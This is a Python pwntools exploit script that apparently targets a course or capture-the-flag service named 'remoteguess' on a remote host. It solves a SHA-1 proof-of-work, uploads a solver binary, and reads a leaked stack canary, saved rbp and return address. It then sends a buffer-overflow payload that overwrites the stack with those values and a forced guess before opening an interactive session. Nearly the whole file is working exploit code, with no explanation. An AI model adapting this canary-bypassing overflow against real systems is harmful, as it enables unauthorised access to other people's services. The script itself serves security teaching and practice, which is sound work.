#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
from pwn import *

def solve_pow(r):
    prefix = r.recvline().decode().split("'")[1]
    print(time.time(), "solving pow ...")
    solved = b''
    for i in range(1000000000):
        h = hashlib.sha1((prefix + str(i)).encode()).hexdigest()
        if h[:6] == '000000':
            solved = str(i).encode()
            print("solved =", solved)
            break;
    print(time.time(), "done.")
    r.sendlineafter(b'string S: ', base64.b64encode(solved))

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)
# gdb.attach(r,'break 104; continue')
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

r.recvline()
r.recvuntil(b': ')
canary=r.recvlineS().strip()
r.recvuntil(b': ')
rbp=r.recvlineS().strip()
r.recvuntil(b': ')
ra=r.recvlineS().strip()
print(canary,rbp,ra)
canary=int(canary,16)
rbp=int(rbp,16)
ra=int(ra,16)
# print(canary,rbp,ra)
# r.interactive()
guess=48763
gen=str(guess).encode('ascii').ljust(0x18,b'\0')+p64(canary)+p64(rbp)+p64(ra)+p64(0)+p32(0)+p32(guess);
# print(gen,len(gen))
r.sendlineafter(b'answer? ',gen);
r.interactive()
line=r.recvline()


# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :


